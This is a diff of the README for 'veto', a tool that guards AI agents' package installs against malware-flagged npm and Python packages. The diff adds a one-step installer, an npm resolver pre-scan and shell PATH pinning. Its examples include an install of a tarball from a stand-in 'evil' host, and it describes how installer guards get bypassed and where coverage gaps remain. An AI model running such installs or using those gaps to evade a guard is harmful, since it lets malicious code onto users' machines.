@@ -24,6 +24,7 @@ npm install chai-as-upgraded                                  # bare name
 ~/.local/share/mise/installs/node/24.7.0/bin/npm install …    # mise install dir
 npm install https://example.com/evil.tgz                      # opaque tarball URL
 veto npm ci  # against a lockfile naming a flagged package # transitive coverage
+veto npm install clean-direct # refused if npm resolves a flagged transitive
 
 # The canonical Python install form — caught via the python shim,
 # which fast-paths every non-`-m {pm}` invocation back to real python:
@@ -56,30 +57,19 @@ version of the name refuses, since the caller hasn't pinned.
 git clone https://github.com/brynbellomy/veto.git
 cd veto
 make install                                # builds → ~/.local/bin/veto
-make interposer                             # builds libveto_interpose.dylib
-veto sync                                # first-time intel fetch (~10s)
-
-# Layer 2 — PATH shims (any agent shell)
-veto install-shims
-
-# Layer 1 — Claude Code Bash hook (if you use Claude Code)
-veto install-claude-hook
-
-# Layer 3 — native execve interposer (closes subprocess.run([abs_path]))
-veto install-preload --lib $(pwd)/libveto_interpose.dylib --shell-rc auto
-
-# Layer 4 — real-binary wrappers (the strongest layer; wraps homebrew/mise binaries)
-veto install-wrappers
-
-# Verify
-veto doctor
+veto install-all --force                    # shims, shell block, hook,
+                                           # interposer, wrappers, sync, doctor
 ```
 
-Then `source ~/.zshrc` (or open a new terminal) for the interposer env
-vars to take effect.
+`install-all` builds `libveto_interpose.dylib`/`.so` with `make interposer`
+when needed. Then `source ~/.zshrc` (or open a new terminal) for the
+managed shell block and interposer env vars to take effect.
 
-If `veto doctor` shows mise shadowing the Layer 2 shims, see
-[mise PATH ordering](#mise-path-ordering) below.
+If you want to install the layers one at a time, the equivalent commands are
+`veto install-shims`, `veto install-shell`,
+`veto install-claude-hook`, `make interposer`,
+`veto install-preload --lib ./libveto_interpose.dylib --shell-rc auto`,
+`veto install-wrappers`, `veto sync`, and `veto doctor`.
 
 ## Defense layers
 
@@ -90,7 +80,7 @@ agent-bash threat surface.
 | # | Layer | Catches | Install |
 |---|---|---|---|
 | 1 | Claude Code PreToolUse hook | Bash tool calls inside a Claude session, before the shell sees them | `veto install-claude-hook` |
-| 2 | PATH shims (`~/.local/bin/{npm,pip,python,…}`) | bare-name PM invocations in any shell that inherits the user's PATH, including `python -m {pip,uv,pipx,poetry,pdm}` via the python shim | `veto install-shims` |
+| 2 | PATH shims (`~/.local/bin/{npm,pip,python,…}`) plus shell-managed PATH pinning and pip/uv age quarantine | bare-name PM invocations in any shell that inherits the user's PATH, including `python -m {pip,uv,pipx,poetry,pdm}` via the python shim | `veto install-shims && veto install-shell` |
 | 3 | Native execve interposer (`DYLD_INSERT_LIBRARIES` / `LD_PRELOAD`) | absolute-path invocations and `subprocess.run([abs])` in processes that inherit the preload env var | `veto install-preload --lib ./libveto_interpose.{dylib,so}` |
 | 4 | Real-binary wrappers | absolute-path invocations even when env vars are stripped — the dylib doesn't need to load | `veto install-wrappers` |
 
@@ -188,13 +178,18 @@ positive). Veto filters those at ingest so a retracted MAL-* entry
 can't keep refusing a clean package indefinitely — the advisory stays
 in the feed for audit continuity but is treated as inactive.
 
-**Transitive coverage via lockfiles.** When an install verb runs in a
-project with a lockfile (`package-lock.json`, `pnpm-lock.yaml`,
-`yarn.lock`, `uv.lock`, `poetry.lock`, `pdm.lock`), veto parses the
-full resolved transitive tree and gates every (name, version) tuple in
-it — not just the verb's explicit argv. This is the only way to catch
-a flagged transitive dep that's been pinned into the lockfile without
-running the resolver ourselves.
+**Transitive coverage via lockfiles and npm resolver pre-scan.** When an
+install verb runs in a project with a lockfile (`package-lock.json`,
+`pnpm-lock.yaml`, `yarn.lock`, `uv.lock`, `poetry.lock`, `pdm.lock`),
+veto parses the full resolved transitive tree and gates every (name,
+version) tuple in it — not just the verb's explicit argv. For npm
+install-family commands, veto also runs the real npm resolver first in
+an isolated temp copy with
+`--package-lock=true --package-lock-only --ignore-scripts --audit=false --fund=false`, then
+gates the generated `package-lock.json`/`npm-shrinkwrap.json` before the
+real install is allowed to run. If the resolver probe fails, does not
+produce an expected lockfile, or the generated lockfile does not include
+the argv-named packages, veto aborts fail-closed.
 
 **Fail-closed defaults.** Per-source malware feeds are fetched
 concurrently with etag-based caching in `~/.cache/veto/`.
@@ -250,28 +245,23 @@ remote code on their own.
 ## mise PATH ordering
 
 mise prepends its install dir(s) to PATH on `mise activate`. For
-Layer 2 shims to win, `~/.local/bin` must come AFTER mise activate:
+Layer 2 shims to win, let veto install its managed shell block:
 
 ```sh
-# ~/.zshrc
-eval "$(mise activate zsh)"             # mise prepends ITS dirs
-export PATH="$HOME/.local/bin:$PATH"    # then veto takes the front
+veto install-shell
 ```
 
-If mise's `chpwd` hook re-prepends and undoes the reorder on every
-`cd`, add this precmd to pin the order:
+The block is idempotent and contains the PATH pinning hook plus pip/uv
+package-age quarantine wrappers:
 
 ```sh
-_veto_pin_path() { case ":$PATH:" in
-  ":$HOME/.local/bin:"*) ;;
-  *) PATH="$HOME/.local/bin:${PATH//$HOME\/.local\/bin:/}" ;;
-esac }
-precmd_functions+=(_veto_pin_path)
+PIP_UPLOADED_PRIOR_TO=<3-days-ago> veto pip ...
+UV_EXCLUDE_NEWER=<3-days-ago> veto uv ...
 ```
 
 `veto doctor` detects mise (and asdf, pyenv, nvm) install dirs that
-shadow Layer 2 shims and emits this recipe inline in the failure
-output.
+shadow Layer 2 shims, checks that the managed shell block exists, and
+emits the `install-shell` fix inline.
 
 If you'd rather not touch PATH ordering at all, Layer 4
 (`install-wrappers`) sidesteps the issue entirely: it wraps the actual
@@ -306,6 +296,11 @@ these):
 - **Manifest file present but unreadable / malformed** (`package.json`,
   `pyproject.toml`, `requirements.txt`, lockfiles): exit 70, "INTERNAL
   ERROR — install aborted fail-closed"
+- **npm resolver pre-scan fails**: before `npm install`/`npm update`
+  runs for real, veto asks npm to generate a lockfile in an isolated temp
+  directory with scripts disabled. Resolver errors, timeouts, malformed
+  generated lockfiles, or missing generated lockfiles abort the install
+  fail-closed.
 - **Claude Code hook crashes** (parser bug, malformed input): hook
   emits a "deny" with "INTERNAL ERROR in hook script"; if even that
   fails, exits 2 which Claude Code treats as a blocking error
@@ -362,6 +357,11 @@ these):
   falls back to "over-block" (refuse the install) with a debug log
   rather than under-block — safe posture but a known precision gap
   until PEP 440 range matching lands.
+- **Resolver pre-scan is npm-only today.** Existing lockfiles are gated
+  for npm, pnpm, yarn, bun, uv, poetry, and pdm, but only npm currently
+  gets a temp-dir resolver probe for newly named packages. Other
+  ecosystems still rely on argv, manifests, and already-present lockfiles
+  until their safe resolver modes are wired in.
 - **Statically-linked binaries that bypass libc**. Theoretical; no
   real PM does this today.
 
@@ -370,10 +370,11 @@ these):
 Run `veto doctor` in a fresh terminal. It checks:
 
 - `veto` resolves on PATH and is executable.
+- The managed shell integration block exists in your detected shell rc.
 - The shim directory is on PATH, and each PM shim wins the PATH
   lookup (no mise/homebrew binary shadowing it earlier). If a mise
-  shadow is detected, the recipe to fix it appears inline in the
-  output.
+  shadow is detected, the `veto install-shell` fix
+  appears inline in the output.
 - The Claude Code Bash hook is wired in `~/.claude/settings.json`.
 - The native interposer env vars are exported and the library file
   exists.
